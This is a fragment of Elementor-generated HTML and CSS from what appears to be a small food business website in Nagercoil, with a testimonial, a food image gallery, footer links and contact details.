.elementor-widget-divider{--divider-border-style:none;--divider-border-width:1px;--divider-color:#0c0d0e;--divider-icon-size:20px;--divider-element-spacing:10px;--divider-pattern-height:24px;--divider-pattern-size:20px;--divider-pattern-url:none;--divider-pattern-repeat:repeat-x}.elementor-widget-divider .elementor-divider{display:flex}.elementor-widget-divider .elementor-divider__text{font-size:15px;line-height:1;max-width:95%}.elementor-widget-divider .elementor-divider__element{margin:0 var(--divider-element-spacing);flex-shrink:0}.elementor-widget-divider .elementor-icon{font-size:var(--divider-icon-size)}.elementor-widget-divider .elementor-divider-separator{display:flex;margin:0;direction:ltr}.elementor-widget-divider--view-line_icon .elementor-divider-separator,.elementor-widget-divider--view-line_text .elementor-divider-separator{align-items:center}.elementor-widget-divider--view-line_icon .elementor-divider-separator:after,.elementor-widget-divider--view-line_icon .elementor-divider-separator:before,.elementor-widget-divider--view-line_text .elementor-divider-separator:after,.elementor-widget-divider--view-line_text .elementor-divider-separator:before{display:block;content:"";border-block-end:0;flex-grow:1;border-block-start:var(--divider-border-width) var(--divider-border-style) var(--divider-color)}.elementor-widget-divider--element-align-left .elementor-divider .elementor-divider-separator>.elementor-divider__svg:first-of-type{flex-grow:0;flex-shrink:100}.elementor-widget-divider--element-align-left .elementor-divider-separator:before{content:none}.elementor-widget-divider--element-align-left .elementor-divider__element{margin-left:0}.elementor-widget-divider--element-align-right .elementor-divider .elementor-divider-separator>.elementor-divider__svg:last-of-type{flex-grow:0;flex-shrink:100}.elementor-widget-divider--element-align-right .elementor-divider-separator:after{content:none}.elementor-widget-divider--element-align-right .elementor-divider__element{margin-right:0}.elementor-widget-divider--element-align-start .elementor-divider .elementor-divider-separator>.elementor-divider__svg:first-of-type{flex-grow:0;flex-shrink:100}.elementor-widget-divider--element-align-start .elementor-divider-separator:before{content:none}.elementor-widget-divider--element-align-start .elementor-divider__element{margin-inline-start:0}.elementor-widget-divider--element-align-end .elementor-divider .elementor-divider-separator>.elementor-divider__svg:last-of-type{flex-grow:0;flex-shrink:100}.elementor-widget-divider--element-align-end .elementor-divider-separator:after{content:none}.elementor-widget-divider--element-align-end .elementor-divider__element{margin-inline-end:0}.elementor-widget-divider:not(.elementor-widget-divider--view-line_text):not(.elementor-widget-divider--view-line_icon) .elementor-divider-separator{border-block-start:var(--divider-border-width) var(--divider-border-style) var(--divider-color)}.elementor-widget-divider--separator-type-pattern{--divider-border-style:none}.elementor-widget-divider--separator-type-pattern.elementor-widget-divider--view-line .elementor-divider-separator,.elementor-widget-divider--separator-type-pattern:not(.elementor-widget-divider--view-line) .elementor-divider-separator:after,.elementor-widget-divider--separator-type-pattern:not(.elementor-widget-divider--view-line) .elementor-divider-separator:before,.elementor-widget-divider--separator-type-pattern:not([class*=elementor-widget-divider--view]) .elementor-divider-separator{width:100%;min-height:var(--divider-pattern-height);-webkit-mask-size:var(--divider-pattern-size) 100%;mask-size:var(--divider-pattern-size) 100%;-webkit-mask-repeat:var(--divider-pattern-repeat);mask-repeat:var(--divider-pattern-repeat);background-color:var(--divider-color);-webkit-mask-image:var(--divider-pattern-url);mask-image:var(--divider-pattern-url)}.elementor-widget-divider--no-spacing{--divider-pattern-size:auto}.elementor-widget-divider--bg-round{--divider-pattern-repeat:round}.rtl .elementor-widget-divider .elementor-divider__text{direction:rtl}.e-con-inner>.elementor-widget-divider,.e-con>.elementor-widget-divider{width:var(--container-widget-width,100%);--flex-grow:var(--container-widget-flex-grow)}</style>		<div class="elementor-divider">
			<span class="elementor-divider-separator">
						</span>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a2544f7 elementor-widget elementor-widget-heading" data-id="a2544f7" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Call Us Now</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-9f4eb9a elementor-widget elementor-widget-heading" data-id="9f4eb9a" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">+91 9095888399</h2>		</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-5fdade3 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="5fdade3" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-21a072d" data-id="21a072d" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-eaf31ab elementor-widget elementor-widget-heading" data-id="eaf31ab" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Testimonials</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-18030cf elementor-widget elementor-widget-heading" data-id="18030cf" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">What Our Client Says</h2>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-bc876f9" data-id="bc876f9" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-a11da91 elementor-widget elementor-widget-testimonial" data-id="a11da91" data-element_type="widget" data-widget_type="testimonial.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.23.0 - 05-08-2024 */
.elementor-testimonial-wrapper{overflow:hidden;text-align:center}.elementor-testimonial-wrapper .elementor-testimonial-content{font-size:1.3em;margin-bottom:20px}.elementor-testimonial-wrapper .elementor-testimonial-name{line-height:1.5;display:block}.elementor-testimonial-wrapper .elementor-testimonial-job{font-size:.85em;display:block}.elementor-testimonial-wrapper .elementor-testimonial-meta{width:100%;line-height:1}.elementor-testimonial-wrapper .elementor-testimonial-meta-inner{display:inline-block}.elementor-testimonial-wrapper .elementor-testimonial-meta .elementor-testimonial-details,.elementor-testimonial-wrapper .elementor-testimonial-meta .elementor-testimonial-image{display:table-cell;vertical-align:middle}.elementor-testimonial-wrapper .elementor-testimonial-meta .elementor-testimonial-image img{width:60px;height:60px;border-radius:50%;-o-object-fit:cover;object-fit:cover;max-width:none}.elementor-testimonial-wrapper .elementor-testimonial-meta.elementor-testimonial-image-position-aside .elementor-testimonial-image{padding-inline-end:15px}.elementor-testimonial-wrapper .elementor-testimonial-meta.elementor-testimonial-image-position-aside .elementor-testimonial-details{text-align:start}.elementor-testimonial-wrapper .elementor-testimonial-meta.elementor-testimonial-image-position-top .elementor-testimonial-details,.elementor-testimonial-wrapper .elementor-testimonial-meta.elementor-testimonial-image-position-top .elementor-testimonial-image{display:block}.elementor-testimonial-wrapper .elementor-testimonial-meta.elementor-testimonial-image-position-top .elementor-testimonial-image{margin-bottom:20px}</style>		<div class="elementor-testimonial-wrapper">
							<div class="elementor-testimonial-content">Organizations throughout the World to manage heir IT with our unique approach to technology agement and consultancy solutions. Provide users with priate view and access permissions</div>
			
						<div class="elementor-testimonial-meta elementor-has-image elementor-testimonial-image-position-aside">
				<div class="elementor-testimonial-meta-inner">
											<div class="elementor-testimonial-image">
							<img loading="lazy" decoding="async" width="1920" height="1080" src="https://odel.co.in/wp-content/uploads/2023/08/0b7f4e9b-f59c-4024-9f06-b3dc12850ab7-1920-1080.jpg" class="attachment-full size-full wp-image-4735" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/0b7f4e9b-f59c-4024-9f06-b3dc12850ab7-1920-1080.jpg 1920w, https://odel.co.in/wp-content/uploads/2023/08/0b7f4e9b-f59c-4024-9f06-b3dc12850ab7-1920-1080-300x169.jpg 300w, https://odel.co.in/wp-content/uploads/2023/08/0b7f4e9b-f59c-4024-9f06-b3dc12850ab7-1920-1080-1024x576.jpg 1024w, https://odel.co.in/wp-content/uploads/2023/08/0b7f4e9b-f59c-4024-9f06-b3dc12850ab7-1920-1080-768x432.jpg 768w, https://odel.co.in/wp-content/uploads/2023/08/0b7f4e9b-f59c-4024-9f06-b3dc12850ab7-1920-1080-1536x864.jpg 1536w" sizes="(max-width: 1920px) 100vw, 1920px" />						</div>
					
										<div class="elementor-testimonial-details">
														<div class="elementor-testimonial-name">Reson Roy </div>
																						<div class="elementor-testimonial-job">- Tool Customar</div>
													</div>
									</div>
			</div>
					</div>
				</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				</div>
		
		
			</div>

	
</main>

	
		<footer itemtype="https://schema.org/WPFooter" itemscope="itemscope" id="colophon" role="contentinfo">
			<div class='footer-width-fixer'>		<div data-elementor-type="wp-post" data-elementor-id="4784" class="elementor elementor-4784">
						<section class="elementor-section elementor-top-section elementor-element elementor-element-314dcf7 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="314dcf7" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-476de66" data-id="476de66" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-2c42a34 elementor-widget elementor-widget-heading" data-id="2c42a34" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Gallery</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-43bbfbb elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="43bbfbb" data-element_type="widget" data-widget_type="divider.default">
				<div class="elementor-widget-container">
					<div class="elementor-divider">
			<span class="elementor-divider-separator">
						</span>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ad9f213 gallery-spacing-custom elementor-widget elementor-widget-image-gallery" data-id="ad9f213" data-element_type="widget" data-widget_type="image-gallery.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.23.0 - 05-08-2024 */
.elementor-image-gallery .gallery-item{display:inline-block;text-align:center;vertical-align:top;width:100%;max-width:100%;margin:0 auto}.elementor-image-gallery .gallery-item img{margin:0 auto}.elementor-image-gallery .gallery-item .gallery-caption{margin:0}.elementor-image-gallery figure img{display:block}.elementor-image-gallery figure figcaption{width:100%}.gallery-spacing-custom .elementor-image-gallery .gallery-icon{padding:0}@media (min-width:768px){.elementor-image-gallery .gallery-columns-2 .gallery-item{max-width:50%}.elementor-image-gallery .gallery-columns-3 .gallery-item{max-width:33.33%}.elementor-image-gallery .gallery-columns-4 .gallery-item{max-width:25%}.elementor-image-gallery .gallery-columns-5 .gallery-item{max-width:20%}.elementor-image-gallery .gallery-columns-6 .gallery-item{max-width:16.666%}.elementor-image-gallery .gallery-columns-7 .gallery-item{max-width:14.28%}.elementor-image-gallery .gallery-columns-8 .gallery-item{max-width:12.5%}.elementor-image-gallery .gallery-columns-9 .gallery-item{max-width:11.11%}.elementor-image-gallery .gallery-columns-10 .gallery-item{max-width:10%}}@media (min-width:480px) and (max-width:767px){.elementor-image-gallery .gallery.gallery-columns-2 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-3 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-4 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-5 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-6 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-7 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-8 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-9 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-10 .gallery-item{max-width:50%}}@media (max-width:479px){.elementor-image-gallery .gallery.gallery-columns-2 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-3 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-4 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-5 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-6 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-7 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-8 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-9 .gallery-item,.elementor-image-gallery .gallery.gallery-columns-10 .gallery-item{max-width:100%}}</style>		<div class="elementor-image-gallery">
			<div id='gallery-1' class='gallery galleryid-4518 gallery-columns-3 gallery-size-thumbnail'><figure class='gallery-item'>
			<div class='gallery-icon landscape'>
				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="ad9f213" data-elementor-lightbox-title="Tawa-Mutton-1" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6NDY2NywidXJsIjoiaHR0cHM6XC9cL29kZWwuY28uaW5cL3dwLWNvbnRlbnRcL3VwbG9hZHNcLzIwMjNcLzA4XC9UYXdhLU11dHRvbi0xLmpwZyIsInNsaWRlc2hvdyI6ImFkOWYyMTMifQ%3D%3D" href='https://odel.co.in/wp-content/uploads/2023/08/Tawa-Mutton-1.jpg'><img width="150" height="150" src="https://odel.co.in/wp-content/uploads/2023/08/Tawa-Mutton-1-150x150.jpg" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" /></a>
			</div></figure><figure class='gallery-item'>
			<div class='gallery-icon landscape'>
				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="ad9f213" data-elementor-lightbox-title="QuickPepperEggMasala" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6NDY2NiwidXJsIjoiaHR0cHM6XC9cL29kZWwuY28uaW5cL3dwLWNvbnRlbnRcL3VwbG9hZHNcLzIwMjNcLzA4XC9RdWlja1BlcHBlckVnZ01hc2FsYS5qcGciLCJzbGlkZXNob3ciOiJhZDlmMjEzIn0%3D" href='https://odel.co.in/wp-content/uploads/2023/08/QuickPepperEggMasala.jpg'><img width="150" height="150" src="https://odel.co.in/wp-content/uploads/2023/08/QuickPepperEggMasala-150x150.jpg" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" srcset="https://odel.co.in/wp-content/uploads/2023/08/QuickPepperEggMasala-150x150.jpg 150w, https://odel.co.in/wp-content/uploads/2023/08/QuickPepperEggMasala-300x300.jpg 300w, https://odel.co.in/wp-content/uploads/2023/08/QuickPepperEggMasala-768x768.jpg 768w, https://odel.co.in/wp-content/uploads/2023/08/QuickPepperEggMasala.jpg 900w" sizes="(max-width: 150px) 100vw, 150px" /></a>
			</div></figure><figure class='gallery-item'>
			<div class='gallery-icon landscape'>
				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="ad9f213" data-elementor-lightbox-title="veggie-spring-rolls-blog" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6NDYzOSwidXJsIjoiaHR0cHM6XC9cL29kZWwuY28uaW5cL3dwLWNvbnRlbnRcL3VwbG9hZHNcLzIwMjNcLzA4XC92ZWdnaWUtc3ByaW5nLXJvbGxzLWJsb2cuanBnIiwic2xpZGVzaG93IjoiYWQ5ZjIxMyJ9" href='https://odel.co.in/wp-content/uploads/2023/08/veggie-spring-rolls-blog.jpg'><img width="150" height="150" src="https://odel.co.in/wp-content/uploads/2023/08/veggie-spring-rolls-blog-150x150.jpg" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" /></a>
			</div></figure><figure class='gallery-item'>
			<div class='gallery-icon landscape'>
				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="ad9f213" data-elementor-lightbox-title="best_chicken_lollipop_drums_of_chicken" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6NDYzOCwidXJsIjoiaHR0cHM6XC9cL29kZWwuY28uaW5cL3dwLWNvbnRlbnRcL3VwbG9hZHNcLzIwMjNcLzA4XC9iZXN0X2NoaWNrZW5fbG9sbGlwb3BfZHJ1bXNfb2ZfY2hpY2tlbi5qcGciLCJzbGlkZXNob3ciOiJhZDlmMjEzIn0%3D" href='https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken.jpg'><img width="150" height="150" src="https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken-150x150.jpg" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" srcset="https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken-150x150.jpg 150w, https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken-300x300.jpg 300w, https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken-1024x1024.jpg 1024w, https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken-768x768.jpg 768w, https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken.jpg 1200w" sizes="(max-width: 150px) 100vw, 150px" /></a>
			</div></figure><figure class='gallery-item'>
			<div class='gallery-icon landscape'>
				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="ad9f213" data-elementor-lightbox-title="Tandoori-Chicken" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6NDYzNywidXJsIjoiaHR0cHM6XC9cL29kZWwuY28uaW5cL3dwLWNvbnRlbnRcL3VwbG9hZHNcLzIwMjNcLzA4XC9UYW5kb29yaS1DaGlja2VuLndlYnAiLCJzbGlkZXNob3ciOiJhZDlmMjEzIn0%3D" href='https://odel.co.in/wp-content/uploads/2023/08/Tandoori-Chicken.webp'><img width="150" height="150" src="https://odel.co.in/wp-content/uploads/2023/08/Tandoori-Chicken-150x150.webp" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" srcset="https://odel.co.in/wp-content/uploads/2023/08/Tandoori-Chicken-150x150.webp 150w, https://odel.co.in/wp-content/uploads/2023/08/Tandoori-Chicken-300x300.webp 300w, https://odel.co.in/wp-content/uploads/2023/08/Tandoori-Chicken-768x768.webp 768w, https://odel.co.in/wp-content/uploads/2023/08/Tandoori-Chicken.webp 1000w" sizes="(max-width: 150px) 100vw, 150px" /></a>
			</div></figure><figure class='gallery-item'>
			<div class='gallery-icon landscape'>
				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="ad9f213" data-elementor-lightbox-title="images" data-e-action-hash="#elementor-action%3Aaction%3Dlightbox%26settings%3DeyJpZCI6NDYwOCwidXJsIjoiaHR0cHM6XC9cL29kZWwuY28uaW5cL3dwLWNvbnRlbnRcL3VwbG9hZHNcLzIwMjNcLzA4XC9pbWFnZXMuanBlZyIsInNsaWRlc2hvdyI6ImFkOWYyMTMifQ%3D%3D" href='https://odel.co.in/wp-content/uploads/2023/08/images.jpeg'><img width="150" height="150" src="https://odel.co.in/wp-content/uploads/2023/08/images-150x150.jpeg" class="attachment-thumbnail size-thumbnail" alt="" decoding="async" /></a>
			</div></figure>
		</div>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-51589d3" data-id="51589d3" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-cdc1b58 elementor-widget elementor-widget-heading" data-id="cdc1b58" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">QUICK LINKS</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-38efcd4 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="38efcd4" data-element_type="widget" data-widget_type="divider.default">
				<div class="elementor-widget-container">
					<div class="elementor-divider">
			<span class="elementor-divider-separator">
						</span>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-3e8f164 hfe-nav-menu__breakpoint-none hfe-nav-menu__align-left hfe-submenu-icon-arrow hfe-link-redirect-child elementor-widget elementor-widget-navigation-menu" data-id="3e8f164" data-element_type="widget" data-settings="{&quot;padding_horizontal_menu_item&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:15,&quot;sizes&quot;:[]},&quot;padding_horizontal_menu_item_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_horizontal_menu_item_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_vertical_menu_item&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:15,&quot;sizes&quot;:[]},&quot;padding_vertical_menu_item_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_vertical_menu_item_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;menu_space_between&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;menu_space_between_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;menu_space_between_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;dropdown_border_radius&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;dropdown_border_radius_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;dropdown_border_radius_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;padding_horizontal_dropdown_item&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_horizontal_dropdown_item_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_horizontal_dropdown_item_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_vertical_dropdown_item&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:15,&quot;sizes&quot;:[]},&quot;padding_vertical_dropdown_item_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_vertical_dropdown_item_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;distance_from_menu&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;distance_from_menu_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;distance_from_menu_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_size_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_size_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_width&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_width_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_width_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_radius&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_radius_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_radius_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="navigation-menu.default">
				<div class="elementor-widget-container">
						<div class="hfe-nav-menu hfe-layout-vertical hfe-nav-menu-layout vertical" data-layout="vertical">
				<div role="button" class="hfe-nav-menu__toggle elementor-clickable">
					<span class="screen-reader-text">Menu</span>
					<div class="hfe-nav-menu-icon">
											</div>
				</div>
				<nav class="hfe-nav-menu__layout-vertical hfe-nav-menu__submenu-arrow" data-toggle-icon="" data-close-icon="" data-full-width="">
					<ul id="menu-1-3e8f164" class="hfe-nav-menu"><li id="menu-item-4990" class="menu-item menu-item-type-post_type menu-item-object-page parent hfe-creative-menu"><a href="https://odel.co.in/index.php/privacy-policy-2/" class = "hfe-menu-item">Privacy policy</a></li>
<li id="menu-item-4988" class="menu-item menu-item-type-post_type menu-item-object-page parent hfe-creative-menu"><a href="https://odel.co.in/index.php/terms-and-conditions/" class = "hfe-menu-item">Terms and Conditions</a></li>
<li id="menu-item-4989" class="menu-item menu-item-type-post_type menu-item-object-page parent hfe-creative-menu"><a href="https://odel.co.in/index.php/refund_returns-2/" class = "hfe-menu-item">Refund and Returns</a></li>
</ul> 
				</nav>
			</div>
					</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-d4c6044" data-id="d4c6044" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-64bc014 elementor-widget elementor-widget-heading" data-id="64bc014" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Contact Us</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-0342eb6 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="0342eb6" data-element_type="widget" data-widget_type="divider.default">
				<div class="elementor-widget-container">
					<div class="elementor-divider">
			<span class="elementor-divider-separator">
						</span>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ea5cc13 elementor-position-left elementor-vertical-align-middle elementor-view-default elementor-mobile-position-top elementor-widget elementor-widget-icon-box" data-id="ea5cc13" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">

						<div class="elementor-icon-box-icon">
				<span  class="elementor-icon elementor-animation-">
				<svg xmlns="http://www.w3.org/2000/svg" width="19" height="28" viewBox="0 0 19 28" fill="none"><path d="M9.35671 26.4798C8.71671 25.6398 8.16671 24.8798 7.70671 24.1998C5.68671 21.3598 4.04671 18.6298 2.78671 16.0098C2.38671 15.1698 2.07671 14.4498 1.85671 13.8498C1.55671 13.0498 1.33671 12.2998 1.19671 11.5998C0.616708 8.65979 1.30671 6.08979 3.26671 3.88979C5.12671 1.76979 7.51671 0.769791 10.4367 0.88979C11.7367 0.92979 12.9667 1.26479 14.1267 1.89479C15.2867 2.52479 16.2667 3.36979 17.0667 4.42979C17.8667 5.48979 18.3967 6.65979 18.6567 7.93979C18.9767 9.51979 18.8867 11.0898 18.3867 12.6498C17.5267 15.3498 16.0967 18.2298 14.0967 21.2898C13.5167 22.1898 12.6067 23.5098 11.3667 25.2498L10.1067 27.0198C10.0667 27.0598 10.0367 27.0948 10.0167 27.1248C9.99671 27.1548 9.92171 27.1098 9.79171 26.9898C9.66171 26.8698 9.51671 26.6998 9.35671 26.4798ZM14.3067 9.91979C14.3267 9.17979 14.1617 8.47479 13.8117 7.80479C13.4617 7.13479 12.9717 6.58479 12.3417 6.15479C11.7117 5.72479 11.0267 5.48979 10.2867 5.44979C9.44671 5.40979 8.67171 5.56479 7.96171 5.91479C7.25171 6.26479 6.68671 6.76979 6.26671 7.42979C5.84671 8.08979 5.61671 8.84979 5.57671 9.70979C5.53671 10.4498 5.70171 11.1548 6.07171 11.8248C6.44171 12.4948 6.94671 13.0448 7.58671 13.4748C8.22671 13.9048 8.91671 14.1298 9.65671 14.1498C10.4767 14.1898 11.2367 14.0348 11.9367 13.6848C12.6367 13.3348 13.1967 12.8298 13.6167 12.1698C14.0367 11.5098 14.2667 10.7598 14.3067 9.91979Z" fill="white"></path></svg>				</span>
			</div>
			
						<div class="elementor-icon-box-content">

									<h3 class="elementor-icon-box-title">
						<span  >
							Court Rd, Nagercoil, Tamil Nadu 629001						</span>
					</h3>
				
				
			</div>
			
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b2b8fdb elementor-position-left elementor-vertical-align-middle elementor-view-default elementor-mobile-position-top elementor-widget elementor-widget-icon-box" data-id="b2b8fdb" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">

						<div class="elementor-icon-box-icon">
				<span  class="elementor-icon elementor-animation-">
